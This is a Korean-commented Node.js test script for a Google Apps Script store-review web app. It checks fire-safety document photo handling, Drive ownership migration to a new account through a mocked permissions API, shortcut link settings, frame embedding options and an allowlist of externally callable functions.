ok(run('apiFireDocRotate(A, S8, 270)').r === 270 && run('apiFireDoc(A, S8)').r === 270, '돌린 방향 기억 (270)');
threw = false; try { run('apiFireDocRotate(A, S8, 45)'); } catch (e) { threw = /방향/.test(e.message); }
ok(threw, '엉뚱한 방향 거부');
const fb2 = run('apiFireDocUpload(A, S8, JPG2)'), fd2 = JSON.parse(fb2.store.fireDoc);
ok(fd2.f !== fd1.f && drive.items[fd1.f].trashed === true && fd2.r === 0, '다시 올리면 예전 파일은 휴지통, 방향은 처음으로');
ok(run('findStore_(S8)').row.fireDoc && run('apiListStores(A)').some(x => x.id === ctx.S8 && x.fireDoc), '매장 목록에도 들어감 (대시보드 표시용)');
ctx.RS8 = Object.assign({}, run('apiGetStore(A, S8)').reviews.slice(-1)[0], { storeId: ctx.S8, notes: '다시 저장' });
ok(JSON.parse(run('apiSaveReview(A, RS8, false)').store.fireDoc).f === fd2.f, '검토서를 다시 저장해도 협의서 유지');
threw = false; try { run('apiFireDocUpload(A, "없는매장", JPG2)'); } catch (e) { threw = /저장/.test(e.message); }
ok(threw, '저장 안 된 매장 거부');
threw = false; try { run('apiFireDocUpload(A, S8, "data:text/html;base64,PGI+")'); } catch (e) { threw = /형식/.test(e.message); }
ok(threw, '사진이 아닌 파일 거부');
const fdel = run('apiFireDocDelete(A, S8)');
ok(!fdel.store.fireDoc && drive.items[fd2.f].trashed === true, '지우기 → 칸 비움, 파일 휴지통');
threw = false; try { run('apiFireDoc(A, S8)'); } catch (e) { threw = /없습니다/.test(e.message); }
ok(threw, '지운 뒤 보기는 안내');
// 할 일 숫자: 소방 점검 7일 안 + 오픈 전 + 협의서 없음
const tday = run('todayText_()');
const add = n => { const d = new Date(tday + 'T00:00:00Z'); d.setUTCDate(d.getUTCDate() + n); return d.toISOString().slice(0, 10); };
ok(run('fireDocMissing_(' + JSON.stringify({ fireCheckDate: add(3), openDate: add(5) }) + ')') === true, '소방 점검 3일 전·협의서 없음 → 할 일');
ok(run('fireDocMissing_(' + JSON.stringify({ fireCheckDate: add(10), openDate: add(12) }) + ')') === false, '소방 점검 10일 전 → 아직 아님');
ok(run('fireDocMissing_(' + JSON.stringify({ fireCheckDate: add(-5), openDate: add(-1) }) + ')') === false, '오픈 지난 매장 → 아님');
ok(run('fireDocMissing_(' + JSON.stringify({ fireCheckDate: add(1), fireDoc: JSON.stringify({ f: 'x' }) }) + ')') === false, '협의서 있으면 → 아님');
const sm9 = J('doGet({parameter:{api:"summary",key:"' + 'k'.repeat(40) + '"}})');
ok(typeof sm9.counts.fireDocMissing === 'number' && sm9.labels.fireDocMissing === '방재실 협의서 미첨부', '요약 API에 방재실 협의서 미첨부');

// 1.8.3 폴더 ID로 찾기 · 계정 옮기기
console.log('\n1.8.3 폴더 ID로 찾기 · 계정 옮기기');
ctx.DriveApp._backup = () => iter([]); delete props.FOLDER_BACKUP;   // 백업 폴더는 이 가짜 드라이브 밖이라 빼고 봄
const pRoot = run('photoRoot_()');
ok(props.FOLDER_PHOTO === pRoot.getId(), '사진 폴더 ID를 기억');
const decoy = mkFolder('도면협의_사진', myRoot.id); decoy.owner = 'x@other.com';
ok(run('photoRoot_()').getId() === pRoot.getId(), '이름이 같은 폴더가 더 생겨도 기억한 폴더');
const subF = mkFolder('하위', myRoot.id); pRoot.parent = subF.id;
ok(run('photoRoot_()').getId() === pRoot.getId(), '폴더를 다른 곳으로 옮겨도 그대로 찾음');
delete props.FOLDER_PHOTO;
ok(run('photoRoot_()').getId() === pRoot.getId(), '기억이 없으면 이름으로 찾되 내 소유 폴더 먼저');

// 가짜 Drive API (권한 · 소유권 이전)
drive.items.ssid = { id: 'ssid', name: '도면협의', kind: 'file', owner: 'old@gmail.com', trashed: false, getId() { return this.id; }, getName() { return this.name; }, isTrashed() { return false; }, getOwner() { return { getEmail: () => this.owner }; } };
const perms = it => (it.perms = it.perms || [{ id: 'p0', emailAddress: it.owner, role: 'owner' }]);
const apiLog = [];
ctx.UrlFetchApp = { fetch: (url, o) => {
  const m = url.match(/drive\/v3\/files\/([^/?]+)\/permissions(?:\/([^?]+))?(?:\?(.*))?$/);
  const it = drive.items[decodeURIComponent(m[1])], q = m[3] || '', body = o.payload ? JSON.parse(o.payload) : null, me = ctx._me;
  apiLog.push(o.method + ' ' + (m[2] ? 'perm' : 'perms') + ' ' + q);
  const res = (code, j) => ({ getResponseCode: () => code, getContentText: () => JSON.stringify(j) });
  if (!it) return res(404, { error: { message: 'File not found' } });
  const ps = perms(it);
  if (o.method === 'get') return res(200, { permissions: ps });
  if (o.method === 'post') { if (!/sendNotificationEmail=false/.test(q)) return res(400, {}); const p = { id: 'p' + ps.length, emailAddress: body.emailAddress, role: body.role, pendingOwner: false }; ps.push(p); return res(200, p); }
  const p = ps.find(x => x.id === m[2]);
  if (body.pendingOwner) { if (it.owner !== me) return res(403, { error: { message: 'not owner' } }); p.pendingOwner = true; p.role = 'writer'; return res(200, { id: p.id }); }
  if (body.role === 'owner' && /transferOwnership=true/.test(q)) {
    if (p.emailAddress !== me || !p.pendingOwner) return res(403, { error: { message: 'no pending' } });
    ps.forEach(x => { if (x.role === 'owner') x.role = 'writer'; }); p.role = 'owner'; p.pendingOwner = false; it.owner = me; return res(200, { id: p.id });
  }
  return res(400, { error: { message: 'bad' } });
} };
// 사진 폴더 안: 문서번호 폴더 + 사진 2장, 남의 파일 1장
const dn = mkFolder('에비뉴엘컨펌_001_261104', pRoot.id);
const ph1 = mkFile('a.jpg', 'image/jpeg', Buffer.from('1'), dn.id), ph2 = mkFile('b.jpg', 'image/jpeg', Buffer.from('2'), dn.id);
const foreign = mkFile('남의사진.jpg', 'image/jpeg', Buffer.from('3'), pRoot.id); foreign.owner = 'x@other.com';
const alerts2 = []; let promptText = 'new@gmail.com', yesNo = 'YES';
ctx.SpreadsheetApp.getUi = () => ({ prompt: () => ({ getSelectedButton: () => 'OK', getResponseText: () => promptText }),
  alert: (a, b) => { alerts2.push(b === undefined ? a : b); return yesNo; }, Button: { OK: 'OK', YES: 'YES', NO: 'NO', CANCEL: 'CANCEL' }, ButtonSet: { OK: 1, OK_CANCEL: 2, YES_NO_CANCEL: 3 } });
promptText = 'old@gmail.com'; run('migrateSend_()');
ok(/같은 주소/.test(alerts2.pop()), '자기 계정 주소는 거부');
promptText = 'new@gmail.com';
run('MIG.BUDGET = -1'); run('migrateSend_()');
ok(/1분 뒤/.test(alerts2.pop()) && ctx.ScriptApp._t.some(t => t.getHandlerFunction() === 'migrateSendResume'), '시간이 모자라면 1분 뒤 이어하기 예약');
run('MIG.BUDGET = 270000'); run('migrateSendResume()');
ok(ctx.ScriptApp._t.some(t => t.getHandlerFunction() === 'migrateSendResume'), '1.8.6 (결정 41): 예약 번호 없이 부른 이어하기는 아무것도 안 함');
ctx.UIDM = ctx.ScriptApp._t.find(t => t.getHandlerFunction() === 'migrateSendResume').getUniqueId(); run('migrateSendResume({triggerUid: UIDM})');
const tab = () => ss.getSheetByName('_계정이전'), rowsOf = () => tab().getRange(2, 1, tab().getLastRow() - 1, 8).getValues();
let R = rowsOf(), byId = id => R.find(r => r[0] === id);
ok(!ctx.ScriptApp._t.some(t => t.getHandlerFunction() === 'migrateSendResume'), '다 끝나면 이어하기 예약 지움');
ok(byId(pRoot.id)[4] === '요청함' && byId(dn.id)[4] === '요청함' && byId(ph1.id)[4] === '요청함' && byId(ph2.id)[4] === '요청함', '폴더·하위 폴더·사진 모두 이전 요청');
ok(byId(foreign.id)[4] === '건너뜀' && /x@other.com/.test(byId(foreign.id)[5]), '남의 파일은 건너뜀');
ok(byId(ph1.id)[3] === '도면협의_사진/에비뉴엘컨펌_001_261104/a.jpg', '위치(경로) 표시');
ok(byId('ssid')[1] === '시트' && byId('ssid')[4] === '요청함', '시트도 마지막에 요청');
ok(perms(ph1).some(x => x.emailAddress === 'new@gmail.com' && x.pendingOwner && x.role === 'writer'), '새 계정 = 편집자 + 이전 대기');
ok(apiLog.filter(x => x.startsWith('post')).every(x => /sendNotificationEmail=false/.test(x)), '공유 알림 메일은 보내지 않음');
alerts2.length = 0;
// 다시 누르면 이어서 (이미 요청한 것은 건너뜀)
const nPatch = apiLog.length; yesNo = 'YES'; run('migrateSend_()');
ok(apiLog.length === nPatch && /모두 보냈습니다/.test(alerts2.pop()), '다시 눌러도 같은 요청을 또 보내지 않음');
// 받기: 기존 계정으로 누르면 안내
run('migrateAccept_()');
ok(/새 계정\(new@gmail.com\)/.test(alerts2.pop()), '받기는 새 계정에서만');
ctx._me = 'new@gmail.com';
run('migrateAccept_()');
R = rowsOf();
ok(/모두 받았습니다/.test(alerts2.pop()) && R.filter(r => r[4] === '요청함').length === 0, '새 계정에서 모두 받음');
ok(pRoot.owner === 'new@gmail.com' && ph1.owner === 'new@gmail.com' && drive.items.ssid.owner === 'new@gmail.com' && foreign.owner === 'x@other.com', '소유자가 새 계정으로 (남의 파일은 그대로)');
ok(perms(ph1).some(x => x.emailAddress === 'old@gmail.com' && x.role === 'writer'), '기존 계정은 편집자로 남음');
ok(run('photoRoot_()').getId() === pRoot.getId(), '옮긴 뒤에도 같은 사진 폴더 (ID 그대로)');
// 이전 점검
const fz = run('apiFireDocUpload(A, S8, JPG2)'), fzId = JSON.parse(fz.store.fireDoc).f;
let ck = run('migrateCheck_()');
const ckRows = () => ss.getSheetByName('_이전점검').getRange(2, 1, ss.getSheetByName('_이전점검').getLastRow() - 1, 5).getValues();
const live = ckRows().filter(r => !/^삭제보관/.test(r[1]));
ok(live.length >= 3 && live.every(r => r[4] === '이 계정 소유'), '점검: 시트·폴더·협의서가 모두 이 계정 소유 (삭제보관 탭의 지운 매장 사진만 예전 계정) ' + JSON.stringify(ck.counts));
const base = ck.counts['다른 계정 소유'];
ok(ckRows().some(r => r[0] === fzId && /방재실협의서/.test(r[1])), '점검 목록에 어디에 쓰였는지 표시 (매장 · 방재실협의서)');
drive.items[fzId].owner = 'old@gmail.com';
ck = run('migrateCheck_()');
ok(ck.counts['다른 계정 소유'] === base + 1 && ck.others[0] === 'old@gmail.com', '아직 기존 계정 소유인 파일을 찾아 줌');
drive.items[fzId].trashed = true;
ok(run('migrateCheck_()').counts['휴지통'] === 1, '휴지통에 간 파일 표시');
ok(/자동 백업 예약/.test(alerts2.pop()), '점검 결과에 백업 예약·시방서 주소 안내');
ctx.ScriptApp.newTrigger('migrateAcceptResume').timeBased().after(1).create();
run('migrateStop_()');
ok(!ctx.ScriptApp._t.some(t => /^migrate/.test(t.getHandlerFunction())), '이어하기 예약 멈추기');
ctx._me = 'old@gmail.com';

// 1.8.4 바로가기 주소 (WS-15)
console.log('\n1.8.4 바로가기 주소');
const EXEC = 'https://script.google.com/macros/s/APP/exec', SHELL = 'https://acct.github.io/fm/dw/';
ctx.ScriptApp.getService = () => ({ getUrl: () => EXEC });
ok(run('publicLink_("store=abc")') === EXEC + '?store=abc', '바로가기 주소가 없으면 /exec 그대로');
run('settingsSheet_()');
const setSh = ss.getSheetByName('설정');
ok(setSh && setSh.get(1, 1) === '항목' && setSh.get(2, 1) === '바로가기주소', '`설정` 탭에 「바로가기주소」 줄');
run('settingsSheet_()');
ok(setSh.getLastRow() === 2, '다시 불러도 줄이 늘지 않음');
const al = []; let pt = 'http://bad';
ctx.SpreadsheetApp.getUi = () => ({ prompt: (t, m) => { al.push(m); return { getSelectedButton: () => 'OK', getResponseText: () => pt }; }, alert: (a, b) => { al.push(b === undefined ? a : b); }, Button: { OK: 'OK' }, ButtonSet: { OK: 1, OK_CANCEL: 2 } });
run('showAddresses_()');
ok(/https:\/\/script\.google\.com\/macros\/s\/APP\/exec/.test(al[0]) && /형식이 맞지 않습니다/.test(al[1]) && setSh.get(2, 2) === '', '메뉴 ⑧: 웹앱 주소 표시, 형식이 틀리면 저장 안 함');
pt = SHELL; al.length = 0; run('showAddresses_()');
ok(setSh.get(2, 2) === SHELL && /저장했습니다/.test(al[1]) && al[1].indexOf(SHELL + '?store=시험') >= 0, '바로가기 주소 저장 + 시험 주소 안내');
ok(run('publicLink_("store=abc")') === SHELL + '?store=abc', 'QR 링크 = 바로가기 주소 + ?store=');
ok(run('apiBootstrap(A)').publicUrl === SHELL && run('apiBootstrap(A)').appUrl === EXEC, '부트스트랩: 화면 QR용 publicUrl, /exec도 그대로');
ok(run('apiBootstrap(A)').guide.mp4 === SHELL + 'sign_guide.mp4' && run('apiBootstrap(A)').guide.gif === SHELL + 'sign_guide.gif', '1.8.7 서명 안내 영상 주소 = 바로가기 주소 + sign_guide.mp4/gif');
ok(run('blockStores_("")').stores.every(x => x.url.indexOf(SHELL + '?store=') === 0), '다른 앱에 주는 매장 링크도 바로가기 주소');
const smB = J('doGet({parameter:{api:"summary",key:"' + 'k'.repeat(40) + '"}})');
ok(smB.url === EXEC && smB.link === SHELL, '요약 API: 앱끼리 부르는 url은 /exec 그대로, 사람이 여는 link는 바로가기 주소');
const n2 = sent.length;
run('apiSigRequest(A, S8, 1, [{who:"sales", email:"sales.lee@lotte.net"}], "' + pdfUri + '", "검토서2.pdf")');
ok(sent.length === n2 + 1 && sent[n2].body.indexOf(SHELL + '?sign=') >= 0 && sent[n2].body.indexOf(EXEC) < 0, '원격 서명 메일 링크 = 바로가기 주소 + ?sign=');
setSh.set(2, 2, SHELL + '?x=1');
ok(run('publicLink_("store=abc")') === EXEC + '?store=abc', '시트에서 형식이 틀리게 고치면 쓰지 않고 /exec');
pt = ''; al.length = 0; run('showAddresses_()');
ok(setSh.get(2, 2) === '' && /지웠습니다/.test(al[1]) && run('publicLink_("store=abc")') === EXEC + '?store=abc', '비우면 지우고 /exec로');
// 모든 웹앱 화면 출력에 ALLOWALL
let xf = null;
ctx.HtmlService.XFrameOptionsMode = { ALLOWALL: 'ALLOWALL' };
ctx.HtmlService.createTemplateFromFile = () => ({ evaluate: () => { const o = { setTitle: () => o, addMetaTag: () => o, setXFrameOptionsMode: m => { xf = m; return o; } }; return o; } });
run('doGet({parameter:{store:"abc"}})'); ok(xf === 'ALLOWALL', 'doGet 화면(?store=) ALLOWALL');
xf = null; run('doGet({parameter:{sign:"' + 'a'.repeat(40) + '"}})'); ok(xf === 'ALLOWALL', 'doGet 서명 화면(?sign=) ALLOWALL');
xf = null; run('doGet({parameter:{}})'); ok(xf === 'ALLOWALL', 'doGet 기본 화면 ALLOWALL');

// 1.8.6 (결정 41): 웹앱 화면에서 이름으로 부를 수 있는 함수(이름이 _로 안 끝남)는 정한 것만 — 시트 메뉴 함수는 모두 _
const pubFns = [...(fs.readFileSync(path.join(src, 'Code.gs'), 'utf8') + fs.readFileSync(path.join(src, 'Supa.gs'), 'utf8')).matchAll(/^function\s+([A-Za-z0-9$]+)\s*\(/gm)].map(m => m[1]).filter(n => !/_$/.test(n));
const badFns = pubFns.filter(n => !/^(doGet|doPost|include|onOpen|api[A-Z]\w*|backupDaily|migrateSendResume|migrateAcceptResume|sbArchiveWeekly|sbArchiveContinue)$/.test(n));
ok(!badFns.length, '밖에서 부를 수 있는 함수는 진입점·화면용 api…·예약(번호 확인)만 ' + badFns.join(', '));

console.log('\n서버 로직 점검 통과');
